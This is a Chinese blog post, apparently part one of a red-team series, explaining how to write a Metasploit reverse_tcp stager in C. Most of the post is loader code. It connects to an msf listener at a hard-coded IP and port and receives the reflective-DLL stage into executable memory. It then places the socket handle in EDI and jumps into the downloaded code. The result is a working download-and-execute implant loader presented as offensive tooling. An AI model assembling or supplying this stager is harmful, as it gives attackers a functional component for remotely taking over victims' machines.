---
title: msf stagers开发不完全指北(一)
date: 2020-06-23 18:19:00
tags:
- msf
- 红队
- 工具
categories:
- 开发
---

# 采用c开发stagers

<!--more-->

## 前言

之前有写过一篇 [metasploit payload运行原理浅析(sockedi调用约定是什么)](https://www.cnblogs.com/Akkuman/p/12859091.html)，里面有提到以后了解这些东西后可以做的事情，其实包括但不限于自写stagers，扩展C2 实现。本系列将从之前这篇文章中获取到的原理性知识进行实践，一步步记录我在这个过程中踩到的坑与收获，这个系列可能会更新得比较慢，也可能会不定期鸽，希望大家能够一同学习，有什么错误的地方也欢迎大家来探讨指正。

## 前情提要

上面我们给出的文章讲到关于第一阶段与第二阶段的交互原理

简要概括一下，对于 reverse_tcp 的payload 来说，所给出的 payload 是第一阶段 (stagers)，然后它会发起 socket tcp 连接请求向远端请求第二阶段 (stages) ，这个阶段是一个反射 dll，然后把 socket fd (socket文件描述符) 放入 edi 寄存器，开始从起始地址执行第二阶段，第二阶段后续的操作会用到这个 socket fd，所以一开始需要传入，后面的关于这个 dll 具体运作以及为什么能直接从起始地址开始跑我们暂时不需要关心，这个在我上一篇文章中已有提及。

## 明确思路

上面的流程说的已经比较明白了（此篇文章里我将采用 [metasploit-loader](https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c) 作为代码讲解）：

1. 向 msf 监听地址发起 tcp 请求

2. 获取 stages

3. 将 socket fd 放入寄存器 edi

4. 从起始地址开始执行 stages



### 发起tcp请求stages

先贴代码

首先我们需要创建一个socket连接

```c
/* 错误处理 */
void punt(SOCKET my_socket, char * error) {
	printf("Bad things: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}

...

WSADATA	wsaData;
WORD 		wVersionRequested;

wVersionRequested = MAKEWORD(2, 2);

if (WSAStartup(wVersionRequested, &wsaData) < 0) {
    printf("ws2_32.dll is out of date.\n");
    WSACleanup();
    exit(1);
}

struct hostent *		target;
struct sockaddr_in 	sock;
SOCKET 			my_socket;
char* targetip = "192.168.174.136"
int port = 4444

/* 创建socket */
my_socket = socket(AF_INET, SOCK_STREAM, 0);
if (my_socket == INVALID_SOCKET)
    punt(my_socket, "Could not initialize socket");

/* 解析targetip*/
target = gethostbyname(targetip);
if (target == NULL)
    punt(my_socket, "Could not resolve target");


/* 准备tcp连接相关信息 */
memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons(port);

/* 连接 */
if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
    punt(my_socket, "Could not connect to target");
```

这部分代码就是和我们的 msf 监听地址建立 socket 连接

接下来关于stages有点需要说明的。

stages结构：

- 开头 4byte 是后续的 tcp 包长度
- 4byte 后紧跟的是一个 dll，也就是一个pe文件

那么我们按照这个方式去读

```c
int count = recv(my_socket, (char *)&size, 4, 0);
if (count != 4 || size <= 0)
    punt(my_socket, "read a strange or incomplete length value\n");
```

读出后面的 dll 数据包长度

然后我们开始读取 dll

```c
/* 接收指定长度的数据 */
int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;

		if (nret == SOCKET_ERROR)
			punt(my_socket, "Could not receive data");
	}
	return tret;
}

buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (buffer == NULL)
    punt(my_socket, "could not allocate buffer\n");

/* 把 socket fd 放入 edi 寄存器，注意这里的 socket 句柄需要取到句柄指向的那个数据，而不是句柄指针
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
buffer[0] = 0xBF;

/* 构造上面的机器码 */
memcpy(buffer + 1, &my_socket, 4);

/* 把读取出来的数据放到 buffer 后面 */
count = recv_all(my_socket, buffer + 5, size);
```

这里需要注意的地方是把 socket fd 放入 edi，这个过程是比较重要的，具体的原理我在上一篇文章有提到。

## 执行stages

现在我们只需要像之前执行 shellcode 那样执行即可

```c
/* 把buffer强转为一个函数去调用 */
function = (void (*)())buffer;
function();

```

然后把这些代码组合起来进行编译

## 编译

编译需要注意的点是：**payload必须对应**

比如32位的payload必须编译为32位的，相应的64位必须编译为64位